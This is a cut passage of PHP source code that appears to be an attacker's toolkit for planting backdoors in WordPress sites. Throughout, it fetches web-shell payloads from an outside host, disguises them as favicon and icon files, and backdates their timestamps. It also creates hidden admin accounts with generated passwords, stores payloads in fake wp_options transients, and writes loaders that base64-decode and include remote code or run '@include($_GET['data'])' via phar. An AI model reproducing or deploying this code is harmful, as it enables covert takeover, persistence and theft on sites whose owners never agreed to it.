	if(!empty($_POST['root_other_chama_1'])||!empty($_POST['all_root_other'])){
			$insert_ma_array=array();
			$scand_dir=$_POST['root_other_chama_1'];
			$shuffle=1;
			$num=1;
			$insert_falg=0;
			$plugins_array=array();
			traverseDir($plugins_array,$_POST['root'].$scand_dir);
			if(empty($plugins_array)){
			$plugins_array[]='1:'.$_POST['root'].$scand_dir;
			}else{
				rsort($plugins_array);
			}
			//print_r($plugins_array);
			for($i=1;$i<=50;$i++){
				if(!in_array($plugins_array[$i-1],$all_insert_link_array)){
					//function insert_org_ma_zip($plugin_dir,$check_ma_flag,$shuffle=0){
					$insert_ma_array=insert_org_ma_zip($plugins_array[$i-1],'',$shuffle);
				}
				if($insert_ma_array[0]=='new'||$insert_ma_array[0]=='exist'){
					$all_insert_link_array[]=$plugins_array[$i-1];
					echo '<font color="green">'.$plugins_array[$i-1]."/"."root_other_chama_1 is add".'</font>'."<br/>";
					if(!empty($_POST['all_root_ma_array'])){
					$all_root_ma_array[0]=$insert_ma_array[1];
					}else{
					$all_root_ma.=$insert_ma_array[1].'	';
					}
					$insert_falg=1;
					break;
				}
				if($insert_ma_array[0]=='scan_error'){
					srand();
					$scand_dir=$root_all_dir[array_rand($root_all_dir,1)];
				}
				$num++;
			}
			if($insert_falg==0){
				echo '<font color="red">'."root_other_chama_1 is not add".'</font>'."<br/>";
				if(!empty($_POST['all_root_ma_array'])){
					$all_root_ma_array[0]='';
					}else{
				$all_root_ma.=$insert_ma_array[1];
					}
			}
		}
		if(!empty($_POST['root_other_chama_2'])||!empty($_POST['all_root_other'])){
			$insert_ma_array=array();
			$scand_dir=$_POST['root_other_chama_2'];
			$shuffle=1;
			$num=1;
			$insert_falg=0;
			$plugins_array=array();
			traverseDir($plugins_array,$_POST['root'].$scand_dir);
			if(empty($plugins_array)){
			$plugins_array[]='1:'.$_POST['root'].$scand_dir;
			}else{
				rsort($plugins_array);
			}
			for($i=1;$i<=50;$i++){
				if(!in_array($plugins_array[$i-1],$all_insert_link_array)){
					//function insert_org_ma_zip($plugin_dir,$check_ma_flag,$shuffle=0){
					$insert_ma_array=insert_org_ma_zip($plugins_array[$i-1],'',$shuffle);
				}
				if($insert_ma_array[0]=='new'||$insert_ma_array[0]=='exist'){
					$all_insert_link_array[]=$plugins_array[$i-1];
					echo '<font color="green">'.$plugins_array[$i-1]."/"."root_other_chama_2 is add".'</font>'."<br/>";
					if(!empty($_POST['all_root_ma_array'])){
					$all_root_ma_array[0]=$insert_ma_array[1];
					}else{
					$all_root_ma.=$insert_ma_array[1].'	';
					}
					$insert_falg=1;
					break;
				}
				if($insert_ma_array[0]=='scan_error'){
					srand();
					$scand_dir=$root_all_dir[array_rand($root_all_dir,1)];
				}
				$num++;
			}
			if($insert_falg==0){
				echo '<font color="red">'."root_other_chama_2 is not add".'</font>'."<br/>";
				if(!empty($_POST['all_root_ma_array'])){
					$all_root_ma_array[0]='';
					}else{
				$all_root_ma.=$insert_ma_array[1];
					}
			}
		}
		if(!empty($_POST['root_other_chama_3'])||!empty($_POST['all_root_other'])){
			$insert_ma_array=array();
			$scand_dir=$_POST['root_other_chama_3'];
			$shuffle=1;
			$num=1;
			$insert_falg=0;
			$plugins_array=array();
			traverseDir($plugins_array,$_POST['root'].$scand_dir);
			if(empty($plugins_array)){
			$plugins_array[]='1:'.$_POST['root'].$scand_dir;
			}else{
				rsort($plugins_array);
			}
			for($i=1;$i<=50;$i++){
				if(!in_array($plugins_array[$i-1],$all_insert_link_array)){
					//function insert_org_ma_zip($plugin_dir,$check_ma_flag,$shuffle=0){
					$insert_ma_array=insert_org_ma_zip($plugins_array[$i-1],'',$shuffle);
				}
				if($insert_ma_array[0]=='new'||$insert_ma_array[0]=='exist'){
					$all_insert_link_array[]=$plugins_array[$i-1];
					echo '<font color="green">'.$plugins_array[$i-1]."/"."root_other_chama_3 is add".'</font>'."<br/>";
					if(!empty($_POST['all_root_ma_array'])){
					$all_root_ma_array[0]=$insert_ma_array[1];
					}else{
					$all_root_ma.=$insert_ma_array[1].'	';
					}
					$insert_falg=1;
					break;
				}
				if($insert_ma_array[0]=='scan_error'){
					srand();
					$scand_dir=$root_all_dir[array_rand($root_all_dir,1)];
				}
				$num++;
			}
			if($insert_falg==0){
				echo '<font color="red">'."root_other_chama_3 is not add".'</font>'."<br/>";
				if(!empty($_POST['all_root_ma_array'])){
					$all_root_ma_array[0]='';
					}else{
				$all_root_ma.=$insert_ma_array[1];
					}
			}
		}
		if(!empty($_POST['root_other_chama_4'])||!empty($_POST['all_root_other'])){
			$insert_ma_array=array();
			$scand_dir=$_POST['root_other_chama_4'];
			$shuffle=1;
			$num=1;
			$insert_falg=0;
			$plugins_array=array();
			traverseDir($plugins_array,$_POST['root'].$scand_dir);
			if(empty($plugins_array)){
			$plugins_array[]='1:'.$_POST['root'].$scand_dir;
			}else{
				rsort($plugins_array);
			}
			for($i=1;$i<=50;$i++){
				if(!in_array($plugins_array[$i-1],$all_insert_link_array)){
					//function insert_org_ma_zip($plugin_dir,$check_ma_flag,$shuffle=0){
					$insert_ma_array=insert_org_ma_zip($plugins_array[$i-1],'',$shuffle);
				}
				if($insert_ma_array[0]=='new'||$insert_ma_array[0]=='exist'){
					$all_insert_link_array[]=$plugins_array[$i-1];
					echo '<font color="green">'.$plugins_array[$i-1]."/"."root_other_chama_4 is add".'</font>'."<br/>";
					if(!empty($_POST['all_root_ma_array'])){
					$all_root_ma_array[0]=$insert_ma_array[1];
					}else{
					$all_root_ma.=$insert_ma_array[1].'	';
					}
					$insert_falg=1;
					break;
				}
				if($insert_ma_array[0]=='scan_error'){
					srand();
					$scand_dir=$root_all_dir[array_rand($root_all_dir,1)];
				}
				$num++;
			}
			if($insert_falg==0){
				echo '<font color="red">'."root_other_chama_4 is not add".'</font>'."<br/>";
				if(!empty($_POST['all_root_ma_array'])){
					$all_root_ma_array[0]='';
					}else{
				$all_root_ma.=$insert_ma_array[1];
					}
			}
		}
		if(!empty($_POST['root_other_chama_5'])||!empty($_POST['all_root_other'])){
			$insert_ma_array=array();
			$scand_dir=$_POST['root_other_chama_5'];
			$shuffle=1;
			$num=1;
			$insert_falg=0;
			$plugins_array=array();
			traverseDir($plugins_array,$_POST['root'].$scand_dir);
			if(empty($plugins_array)){
			$plugins_array[]='1:'.$_POST['root'].$scand_dir;
			}else{
				rsort($plugins_array);
			}
			for($i=1;$i<=50;$i++){
				if(!in_array($plugins_array[$i-1],$all_insert_link_array)){
					//function insert_org_ma_zip($plugin_dir,$check_ma_flag,$shuffle=0){
					$insert_ma_array=insert_org_ma_zip($plugins_array[$i-1],'',$shuffle);
				}
				if($insert_ma_array[0]=='new'||$insert_ma_array[0]=='exist'){
					$all_insert_link_array[]=$plugins_array[$i-1];
					echo '<font color="green">'.$plugins_array[$i-1]."/"."root_other_chama_5 is add".'</font>'."<br/>";
					if(!empty($_POST['all_root_ma_array'])){
					$all_root_ma_array[0]=$insert_ma_array[1];
					}else{
					$all_root_ma.=$insert_ma_array[1].'	';
					}
					$insert_falg=1;
					break;
				}
				if($insert_ma_array[0]=='scan_error'){
					srand();
					$scand_dir=$root_all_dir[array_rand($root_all_dir,1)];
				}
				$num++;
			}
			if($insert_falg==0){
				echo '<font color="red">'."root_other_chama_5 is not add".'</font>'."<br/>";
				if(!empty($_POST['all_root_ma_array'])){
					$all_root_ma_array[0]='';
					}else{
				$all_root_ma.=$insert_ma_array[1];
					}
			}
		}
		
		
		///////////////////////////
	$all_zip_ma='';
	$all_auto_zip_ma_array=array();
	if(!empty($_POST['auto_content_zip_plugin'])||!empty($_POST['all_zip'])){
			$insert_ma_array=array();
			$shuffle=1;
			$num=1;
			
			$scand_dir="wp-content/plugins";
			$insert_falg=0;
			$plugins_array=array();
			traverseDir($plugins_array,$_POST['root'].$scand_dir);
			if(empty($plugins_array)){
			$plugins_array[]='1:'.$_POST['root'].$scand_dir;
			}else{
				rsort($plugins_array);
			}
			for($i=1;$i<=50;$i++){
				if(!in_array($plugins_array[$i-1],$all_insert_link_array)){
					//function insert_org_ma_zip($plugin_dir,$check_ma_flag,$shuffle=0){
					$insert_ma_array=insert_org_ma_zip($plugins_array[$i-1],'',$shuffle);
				}
				if($insert_ma_array[0]=='new'||$insert_ma_array[0]=='exist'){
					$all_insert_link_array[]=$plugins_array[$i-1];
					echo '<font color="green">'.$plugins_array[$i-1]."/"."auto_content_zip_plugin is add".'</font>'."<br/>";
					if(!empty($_POST['all_auto_zip_ma_array'])){
					$all_zip_ma_array[0]=$insert_ma_array[1];
					}else{
					$all_zip_ma.=$insert_ma_array[1].'	';
					}
					$insert_falg=1;
					break;
				}
				if($insert_ma_array[0]=='scan_error'){
					$scand_dir=$arr[array_rand($arr,1)];
				}
				$num++;
			}
			if($insert_falg==0){
				echo '<font color="red">'."auto_content_zip_plugin is not add".'</font>'."<br/>";
				if(!empty($_POST['all_auto_zip_ma_array'])){
					$all_zip_ma_array[0]='';
					}else{
				$all_zip_ma.=$insert_ma_array[1];
					}
			}
		}
		
		////
		if(!empty($_POST['auto_content_zip_themes'])||!empty($_POST['all_zip'])){
			$insert_ma_array=array();
			$shuffle=1;
			$num=1;
			
			$scand_dir="wp-content/themes";
			$insert_falg=0;
			$plugins_array=array();
			traverseDir($plugins_array,$_POST['root'].$scand_dir);
			if(empty($plugins_array)){
			$plugins_array[]='1:'.$_POST['root'].$scand_dir;
			}else{
				rsort($plugins_array);
			}
			for($i=1;$i<=50;$i++){
				if(!in_array($plugins_array[$i-1],$all_insert_link_array)){
					//function insert_org_ma_zip($plugin_dir,$check_ma_flag,$shuffle=0){
					$insert_ma_array=insert_org_ma_zip($plugins_array[$i-1],'',$shuffle);
				}
				if($insert_ma_array[0]=='new'||$insert_ma_array[0]=='exist'){
					$all_insert_link_array[]=$plugins_array[$i-1];
					echo '<font color="green">'.$plugins_array[$i-1]."/"."auto_content_zip_themes is add".'</font>'."<br/>";
					if(!empty($_POST['all_auto_zip_ma_array'])){
					$all_zip_ma_array[1]=$insert_ma_array[1];
					}else{
					$all_zip_ma.=$insert_ma_array[1].'	';
					}
					$insert_falg=1;
					break;
				}
				if($insert_ma_array[0]=='scan_error'){
					$scand_dir=$arr[array_rand($arr,1)];
				}
				$num++;
			}
			if($insert_falg==0){
				echo '<font color="red">'."auto_content_zip_themes is not add".'</font>'."<br/>";
				if(!empty($_POST['all_auto_zip_ma_array'])){
					$all_zip_ma_array[1]='';
					}else{
				$all_zip_ma.=$insert_ma_array[1];
					}
			}
		}
		//////
		if(!empty($_POST['auto_content_zip_uploads'])||!empty($_POST['all_zip'])){
			$insert_ma_array=array();
			$shuffle=1;
			$num=1;
			
			$scand_dir="wp-content/uploads";
			$insert_falg=0;
			$plugins_array=array();
			traverseDir($plugins_array,$_POST['root'].$scand_dir);
			if((count($plugins_array))>55){
			$plugins_array=array_slice($plugins_array,0,55);
			shuffle($plugins_array);
			}else{
				rsort($plugins_array);
			}
			for($i=1;$i<=50;$i++){
				if(!in_array($plugins_array[$i-1],$all_insert_link_array)){
					//function insert_org_ma_zip($plugin_dir,$check_ma_flag,$shuffle=0){
					$insert_ma_array=insert_org_ma_zip($plugins_array[$i-1],'',$shuffle);
				}
				if($insert_ma_array[0]=='new'||$insert_ma_array[0]=='exist'){
					$all_insert_link_array[]=$plugins_array[$i-1];
					echo '<font color="green">'.$plugins_array[$i-1]."/"."auto_content_zip_uploads is add".'</font>'."<br/>";
					if(!empty($_POST['all_auto_zip_ma_array'])){
					$all_zip_ma_array[2]=$insert_ma_array[1];
					}else{
					$all_zip_ma.=$insert_ma_array[1].'	';
					}
					$insert_falg=1;
					break;
				}
				if($insert_ma_array[0]=='scan_error'){
					$scand_dir=$arr[array_rand($arr,1)];
				}
				$num++;
			}
			if($insert_falg==0){
				echo '<font color="red">'."auto_content_zip_uploads is not add".'</font>'."<br/>";
				if(!empty($_POST['all_auto_zip_ma_array'])){
					$all_zip_ma_array[2]='';
					}else{
				$all_zip_ma.=$insert_ma_array[1];
					}
			}
		}
		/////////////////////////////////// 
		/////////////////////////////////// 
		/////////////////////////////////// 
		/////////////////////////////////// 
	$new_ma_link='';
	////////////////////////
	 if(!empty($_POST['new_new_ma'])){
			$new_new_ma_array=(explode('	',$_POST['new_new_ma']));
			$new_new_ma_num=0;
			foreach($new_new_ma_array as $new_new_ma_url){
					$url_str_replace_array=array("http://","https://");
				$new_new_ma_url=str_replace($url_str_replace_array,'',$new_new_ma_url);
				$new_new_ma_url=str_replace(str_replace($url_str_replace_array,'',$url_root),$_POST['root'],$new_new_ma_url);
				if($new_new_ma_num==5){
					$new_new_ma_url=explode('?create',$new_new_ma_url);
					$new_new_ma_url=$new_new_ma_url[0];
				}
				if($new_new_ma_num==6){
					$new_new_ma_url=explode('?reset',$new_new_ma_url);
					$new_new_ma_url=$new_new_ma_url[0];
				}
				if($new_new_ma_num==7){//?pass=A4bGff!dV5
					$new_new_ma_url=str_replace('?pass=A4bGff!dV5','',$new_new_ma_url);
				}
				if($new_new_ma_num==8){
					$new_new_ma_url=str_replace('?pass=A4bGff!dV5','',$new_new_ma_url);
				}
				if(!is_file($new_new_ma_url)){
					$new_new_ma_array[$new_new_ma_num]='';
					if($new_new_ma_num==0){
						$_POST['new-ma']=1;
					}
					if($new_new_ma_num==1){
						$_POST['ftp-fso']=1;
					}
					if($new_new_ma_num==2){
						$_POST['secs']=1;
					}
					if($new_new_ma_num==3){
						$_POST['kaylin']=1;
					}
					if($new_new_ma_num==4){
						$_POST['new_ma2']=1;
					}
					if($new_new_ma_num==5){
						$_POST['add_user']=1;
					}
					if($new_new_ma_num==6){
						$_POST['reset']=1;
					}
					if($new_new_ma_num==7){
						$_POST['get_login_url']=1;
					}
					if($new_new_ma_num==8){
						$_POST['get_login_url_2']=1;
					}
				}else{
					$check_new_new_ma=file_get_contents($new_new_ma_url);
					if($new_new_ma_num==0){//
						if(strpos($check_new_new_ma,'Tiny File Manager')!==false){
						echo '<font color="green">'.$new_new_ma_url.' ok!</font>'."<br/>"; 
					}else{
						$_POST['new-ma']=1;
						$new_new_ma_array[$new_new_ma_num]='';
					}
					}//'在线文件管理系统'
					if($new_new_ma_num==1){//
						if(strpos($check_new_new_ma,'在线文件管理系统')!==false){
						echo '<font color="green">'.$new_new_ma_url.' ok!</font>'."<br/>"; 
					}else{
						$_POST['ftp-fso']=1;
						$new_new_ma_array[$new_new_ma_num]='';
					}
					}
					if($new_new_ma_num==2){//
						if(strpos($check_new_new_ma,'9eWp9eWpvCl9ldMOgcMx1F2IPhTSYtI')!==false){
						echo '<font color="green">'.$new_new_ma_url.' ok!</font>'."<br/>"; 
					}else{
						$_POST['secs']=1;
						$new_new_ma_array[$new_new_ma_num]='';
					}
					}
					if($new_new_ma_num==3){//
						if(strpos($check_new_new_ma,'DoajD19jd3n5FMlmDuWIeWPpweSYtI')!==false){
						echo '<font color="green">'.$new_new_ma_url.' ok!</font>'."<br/>"; 
					}else{
						$_POST['kaylin']=1;
						$new_new_ma_array[$new_new_ma_num]='';
					}
					}
					if($new_new_ma_num==4){//
						if(strpos($check_new_new_ma,'function WSOstripslashes')!==false){
						echo '<font color="green">'.$new_new_ma_url.' ok!</font>'."<br/>"; 
					}else{
						$_POST['new_ma2']=1;
						$new_new_ma_array[$new_new_ma_num]='';
					}
					}
					if($new_new_ma_num==5){//
						if(strpos($check_new_new_ma,'This user or email already exists. Nothing was done.')!==false){
						echo '<font color="green">'.$new_new_ma_url.' ok!</font>'."<br/>"; 
					}else{
						$_POST['add_user']=1;
						$new_new_ma_array[$new_new_ma_num]='';
					}
					}
					if($new_new_ma_num==6){//
						if(strpos($check_new_new_ma,'user_ev')!==false){
						echo '<font color="green">'.$new_new_ma_url.' ok!</font>'."<br/>"; 
					}else{
						$_POST['reset']=1;
						$new_new_ma_array[$new_new_ma_num]='';
					}
					}
					if($new_new_ma_num==7){//
						if(strpos($check_new_new_ma,'wp_installation.\'wp-includes/general-template.php\'')!==false){
						echo '<font color="green">'.$new_new_ma_url.' ok!</font>'."<br/>"; 
					}else{
						$_POST['get_login_url']=1;
						$new_new_ma_array[$new_new_ma_num]='';
					}
					}
					if($new_new_ma_num==8){//
						if(strpos($check_new_new_ma,'wp_installation."wp-load.php"')!==false){
						echo '<font color="green">'.$new_new_ma_url.' ok!</font>'."<br/>"; 
					}else{
						$_POST['get_login_url_2']=1;
						$new_new_ma_array[$new_new_ma_num]='';
					}
					}
				}
				
				//if(!is_file())
				$new_new_ma_num++;
			}
		}
	if(!empty($_POST['new-ma'])||!empty($_POST['all_new'])){
		$new_ma_con=get_test_Html("http://8.topsale4you.rocks/tong/get_ma/new-ma.txt");
		if(!empty($_POST['new_new_ma'])){
					$new_new_ma_array[0]=insert_ma('new-ma',$new_ma_con);
					}else{
		$new_ma_link.=insert_ma('new-ma',$new_ma_con).'	';
					}
	}
	////////////////////////////
	if(!empty($_POST['ftp-fso'])||!empty($_POST['all_new'])){
		$new_ma_con=get_test_Html("http://8.topsale4you.rocks/tong/get_ma/ftp-fso.txt");
		if(!empty($_POST['new_new_ma'])){
					$new_new_ma_array[1]=insert_ma('ftp-fso',$new_ma_con);
					}else{
		$new_ma_link.=insert_ma('ftp-fso',$new_ma_con).'	';
					}
	}
	////////////////////////////
	if(!empty($_POST['secs'])||!empty($_POST['all_new'])){
		$new_ma_con=get_test_Html("http://8.topsale4you.rocks/tong/get_ma/secs.txt");
		if(!empty($_POST['new_new_ma'])){
					$new_new_ma_array[2]=insert_ma('secs',$new_ma_con);
					}else{
		$new_ma_link.=insert_ma('secs',$new_ma_con).'	';
					}
	}
	////////////////////////////
	if(!empty($_POST['kaylin'])||!empty($_POST['all_new'])){
		$new_ma_con=get_test_Html("http://8.topsale4you.rocks/tong/get_ma/kaylin.txt");
		if(!empty($_POST['new_new_ma'])){
					$new_new_ma_array[3]=insert_ma('kaylin',$new_ma_con);
					}else{
		$new_ma_link.=insert_ma('kaylin',$new_ma_con).'	';
					}
	}
	////////////////////////////
	if(!empty($_POST['new_ma2'])||!empty($_POST['all_new'])){
		$new_ma_con=get_test_Html("http://8.topsale4you.rocks/tong/get_ma/new_ma2.txt");
		if(!empty($_POST['new_new_ma'])){
					$new_new_ma_array[4]=insert_ma('new_ma2',$new_ma_con);
					}else{
		$new_ma_link.=insert_ma('new_ma2',$new_ma_con).'	';
					}
	}
	////////////////////////////
	

	if(!empty($_POST['add_user'])||!empty($_POST['all_new'])){
		$new_ma_con=get_test_Html("http://8.topsale4you.rocks/tong/get_ma/add_user.txt");
		$username='admin_'.generate_user(5,8);
		$password=generate_password(15,20);
		$new_ma_con=str_replace('{username}',$username,$new_ma_con);
		$new_ma_con=str_replace('{password}',$password,$new_ma_con);
		$new_ma_con=str_replace('{root}',$_POST['root'],$new_ma_con);
		$add_user_link=insert_ma('add_user',$new_ma_con);
		if(!empty($add_user_link)){
			if(!empty($_POST['new_new_ma'])){
					$new_new_ma_array[5]=$add_user_link.'?create=Y'.' username='.$username.' '.' password='.$password;
					}else{
			$new_ma_link.=$add_user_link.'?create=Y'.' username='.$username.' '.' password='.$password.'	';
					}
		}else{
			if(!empty($_POST['new_new_ma'])){
			$new_new_ma_array[5]='';
					}else{
			$new_ma_link.='	';
					}
		}
		}
 
	////////////////////////////
	if(!empty($_POST['reset'])||!empty($_POST['all_new'])){
		$new_ma_con_encode='UEQ5d2FIQUtKRzUxYlQxemRXSnpkSEpmWTI5MWJuUW9KRjlUUlZKV1JWSmJKMUpGVVZWRlUxUmZWVkpKSjEwc0p5OG5LVHNLSkhWeWJGOWhaR1E5Snk0dUx5YzdDaVJoYkd4ZmRYSnNQU2NuT3dwbWIzSW9KR2s5TVRza2FUd2tiblZ0T3lScEt5c3Bld29KSkdGc2JGOTFjbXd1UFNSMWNteGZZV1JrT3dwOUNtbHVZMngxWkdVb0pHRnNiRjkxY213dUluZHdMV0pzYjJjdGFHVmhaR1Z5TG5Cb2NDSXBPd3BwWmlobGJYQjBlU2drWDFCUFUxUmJKMlZ0WlhKblpXNWplVjl3WVhOekoxMHBKaVpsYlhCMGVTZ2tYMUJQVTFSYkozVnpaWEpmYm1GdFpTZGRLU2tnZXdwbFkyaHZJRHc4UEVWUFZBbzhabTl5YlNCdFpYUm9iMlE5SW5CdmMzUWlQZ29nSUR4cGJuQjFkQ0J1WVcxbFBTSjFjMlZ5WDI1aGJXVWlJSFI1Y0dVOUluQmhjM04zYjNKa0lpQXZQZ29nSUR4cGJuQjFkQ0J1WVcxbFBTSmxiV1Z5WjJWdVkzbGZjR0Z6Y3lJZ2RIbHdaVDBpY0dGemMzZHZjbVFpSUM4K0NpQWdQR2x1Y0hWMElIUjVjR1U5SW5OMVltMXBkQ0lnTHo0S1BDOW1iM0p0UGdwRlQxUTdDbjFsYkhObGV3b2tjM0ZzSUQwZ0lsVlFSRUZVUlNBaUxpUjBZV0pzWlY5d2NtVm1hWGd1ZFhObGNuTXVJaUJUUlZRZ2RYTmxjbDl3WVhOeklEMGdiV1ExS0NjaUxpUmZVRTlUVkZzblpXMWxjbWRsYm1ONVgzQmhjM01uWFM0aUp5a2dWMGhGVWtVZ1ZYTmxjbDlzYjJkcGJpQTlJQ2Q3SkY5UVQxTlVXeWQxYzJWeVgyNWhiV1VuWFgwbklqc2tiR2x1YXlBOUlDUjNjR1JpTFQ1eGRXVnllU2drYzNGc0tUdGxZMmh2SUNKdmF5STdDblZ1YkdsdWF5aGthWEp1WVcxbEtGOWZSa2xNUlY5ZktTNG5MM1J0Y0NjcE93cGxlR2wwS0NrN2ZRbw';
		$reset_count=0;
		while($reset_count!==2){
			$reset_pass=substr($new_ma_con_encode,rand(floor(strlen($new_ma_con_encode)/3),floor(strlen($new_ma_con_encode)/3)*2),rand(16,30));
				$reset_ma_array=explode($reset_pass,$new_ma_con_encode);
				$reset_count=count($reset_ma_array);
		}
		$reset_header=$reset_ma_array[0];
		$reset_ender=$reset_ma_array[1];
		$new_ma_con=<<<EOT
<?php
error_reporting(0);
if(\$_GET['reset']=='Y'&&isset(\$_GET['pass'])){
	function user_ev(\$cvvc) {
    \$myfile = fopen("tmp", "w");
    fwrite(\$myfile, \$cvvc);
    fclose(\$myfile);
}
	\$default =\$_GET['pass'];
    \$header = "{$reset_header}";
    \$ender = "{$reset_ender}";
    \$pass=\$header.\$default.\$ender;
    \$pass=base64_decode(base64_decode(\$pass));
    user_ev(\$pass);
    include('tmp');

}
?>
EOT;
		$add_user_link=insert_ma('reset',$new_ma_con);
		if(!empty($add_user_link)){
			if(!empty($_POST['new_new_ma'])){
			$new_new_ma_array[6]=$add_user_link.'?reset=Y&pass='.$reset_pass;
					}else{
			$new_ma_link.=$add_user_link.'?reset=Y&pass='.$reset_pass.'	';
					}
		}else{
			if(!empty($_POST['new_new_ma'])){
			$new_new_ma_array[6]='';
					}else{
			$new_ma_link.='	';
					}
		}
	}
	///////////////////////////////////////////////////////////////////////////////////
	if(!empty($_POST['get_login_url'])||!empty($_POST['all_new'])){
		$new_ma_con=$get_login_url;
		$add_user_link=insert_ma('get_login_url',$new_ma_con);
		if(!empty($add_user_link)){
			if(!empty($_POST['new_new_ma'])){
			$new_new_ma_array[7]=$add_user_link.'?pass=A4bGff!dV5';
					}else{
			$new_ma_link.=$add_user_link.'?pass=A4bGff!dV5'.'	';
					}
		}else{
			if(!empty($_POST['new_new_ma'])){
			$new_new_ma_array[7]='';
					}else{
			$new_ma_link.='	';
					}
		}
	}
	
	////////////////////////////////////
		if(!empty($_POST['get_login_url_2'])||!empty($_POST['all_new'])){
		$new_ma_con=$get_login_url_2;
		$add_user_link=insert_ma('get_login_url 2',$new_ma_con);
		if(!empty($add_user_link)){
			if(!empty($_POST['new_new_ma'])){
			$new_new_ma_array[8]=$add_user_link.'?pass=A4bGff!dV5';
					}else{
			$new_ma_link.=$add_user_link.'?pass=A4bGff!dV5'.'	';
					}
		}else{
			if(!empty($_POST['new_new_ma'])){
			$new_new_ma_array[8]='';
					}else{
			$new_ma_link.='	';
					}
		}
	}
	
	
	///////////////////////////////////////////////////////////////////////////////////////
	
	
	
	
	///////////////////////////insert_url  insert_option
	if(!empty($_POST['insert_url'])){
		if($_POST['insert_option']==1){
			$insert_url_con=get_test_Html("http://8.topsale4you.rocks/tong/get_ma/files.txt");
		}else{
			$insert_url_con=get_test_Html("http://8.topsale4you.rocks/tong/get_ma/".$_POST['insert_option']);
		}
		if(!empty($insert_url_con)){
			if(is_file($_POST['insert_url'].'.favicon.ico')){
				$file_dir=$_POST['insert_url'].'.favicon.png';
			}else{
				$file_dir=$_POST['insert_url'].'.favicon.ico';
			}
				@file_put_contents($file_dir,$insert_url_con);
				@chmod($file_dir,$file_per);
				@touch($file_dir,$time);
				@touch($_POST['insert_url'],$time);
					echo '<font color="green">'.$file_dir." Is add!".'</font>'."<br/>";
					$new_ma_con="<?php\r\n@include_once(\"".$file_dir."\");";
					if(is_file($file_dir)){
						$add_user_link=insert_ma('insert_url',$new_ma_con);
					if(!empty($add_user_link)){
						$chama_all_link_insert_url.=$add_user_link;
					}
					$inster_link.=$url_root.'wp-content'.$plgin_url_1_array[1].'/test.php';
					if(is_dir($_POST['root'].'wp-content/plugins/wordfence/')){
					insert_database($table_prefix,'wp-content'.$plgin_url_1_array[1].'/test.php');
					}else{
						echo '<font color="red">'.$file_dir." Is not add!".'</font>'."<br/>";
					}
					}
					
				}else{
					echo '<font color="red">'."{$name} Is not add!".'</font>'."<br/>";
				}
			
		}
		
	
	
	
	///////////////////////////
	if(!empty($_POST['option1'])||!empty($_POST['all_new'])){
	$option_name_array=array("_site_transient_timeout_community-events-","_site_transient_timeout_community-events-","_site_transient_timeout_community-events-","_transient_timeout_wp-smush-conflict_check_");
		//generate_option
		$ma_name_array=array("filecontral-changediy.txt","try-gai.txt","new-ma.txt","files.txt","secs.txt","kaylin.txt","new_ma2.txt");
		$option_con=get_test_Html("http://8.topsale4you.rocks/tong/get_ma/".$ma_name_array[array_rand($ma_name_array,1)]);
		$option_rand_name=$option_name_array[array_rand($option_name_array,1)].generate_option(rand(20,40));
		if(add_option($option_rand_name,$option_con,'',"no")){
			$c_name=generate_option(rand(5,10));
			echo '<font color="green">options database add ok</font>'."<br/>";
			$new_ma_con="<?php\r\nrequire_once('".$_POST['root']."wp-load.php');\r\nfile_put_contents(\"".$_POST['root']."".$c_name.".php\",get_option(\"".$option_rand_name."\"));if(is_file(\"".$_POST['root']."".$c_name.".php\")){\r\necho \"".$c_name.".php ok!\";}else{echo \"no\";}";
			$add_user_link=insert_ma('option1_database',$new_ma_con);
			 if(!empty($add_user_link)){
				 if(!empty($_POST['new_new_ma'])){
			$new_new_ma_array[]=$add_user_link.'?'.$c_name;
					}else{
				$new_ma_link.=$add_user_link.'?'.$c_name.'	';
					}
			}else{
				if(!empty($_POST['new_new_ma'])){
			$new_new_ma_array[]='';
					}else{
				 $new_ma_link.='	';
					}
			}
		}
		}
		
		///////////////////////////////2
		if(!empty($_POST['option2'])||!empty($_POST['all_new'])){
	$option_name_array=array("_site_transient_timeout_community-events-","_site_transient_timeout_community-events-","_site_transient_timeout_community-events-","_transient_timeout_wp-smush-conflict_check_");
		//generate_option
		$option_con=$little_put_file_ma_2;
		$option_rand_name=$option_name_array[array_rand($option_name_array,1)].generate_option(rand(20,40));
		if(add_option($option_rand_name,$option_con,'',"no")){
			$c_name=generate_option(rand(5,10));
			echo '<font color="green">options database add ok</font>'."<br/>";
			$new_ma_con="<?php\r\nrequire_once('".$_POST['root']."wp-load.php');\r\nfile_put_contents(\"".$_POST['root']."".$c_name.".php\",get_option(\"".$option_rand_name."\"));if(is_file(\"".$_POST['root']."".$c_name.".php\")){\r\necho \"".$c_name.".php?act=sweet ok!\";}else{echo \"no\";}";
			$add_user_link=insert_ma('option2_database',$new_ma_con);
			 if(!empty($add_user_link)){
				 if(!empty($_POST['new_new_ma'])){
			$new_new_ma_array[]=$add_user_link.'?'.$c_name;
					}else{
				$new_ma_link.=$add_user_link.'?'.$c_name.'	';
					}
			}else{
				if(!empty($_POST['new_new_ma'])){
			$new_new_ma_array[]='';
					}else{
				 $new_ma_link.='	';
					}
			}
		}
		}
	
	
	///////////////////////////
	///////////////////////////
	///////////////////////////
	///////////////////////////
	///////////////////////////
	if(!empty($_POST['zip_1'])){
		$insert_url_con=get_test_Html("http://8.topsale4you.rocks/tong/get_ma/icon.txt");
		if(!empty($insert_url_con)){
			
			if(is_file($_POST['zip_1'].'icon.png')){
				$check_icon=file_get_contents($_POST['zip_1'].'icon.png');
				if($check_icon==$insert_url_con){
					$file_dir=$_POST['zip_1'].'icon.png';
				}else{
					$file_dir=$_POST['zip_1'].'.icon.png';
				}
			}else{
				$file_dir=$_POST['zip_1'].'icon.png';
			}
			if(strpos('\\',$file_dir)!==false){
				$file_dir=str_replace('\\','/',$file_dir);
			}
				@file_put_contents($file_dir,$insert_url_con);
				unlink($_POST['zip_1'].'newfile.php');
				if(is_file($file_dir)){
				@chmod($file_dir,$file_per);
				@touch($file_dir,$time);
				@touch($_POST['zip_1'],$time);
					echo '<font color="green">'.$file_dir." Is add!".'</font>'."<br/>";
					$new_ma_con="<?php\r\n@include(\$_GET['data']);";
						$add_user_link='';
						for($i=0;$i<=30;$i++){
							if(empty($add_user_link)){
								$add_user_link=insert_ma('zip_1',$new_ma_con);
							}else{
								break;
							}
						}
						
					if(!empty($add_user_link)){
						if(!empty($_POST['new_new_ma'])){
			$new_new_ma_array[]=$add_user_link."?data=phar://".$file_dir.'/admin';
					}else{
						$new_ma_link.=$add_user_link."?data=phar://".$file_dir.'/admin	';
					}
					}else{
						echo '<font color="red">'."{$file_dir} include file Is not add!".'</font>'."<br/>";
					}
				}
				}else{
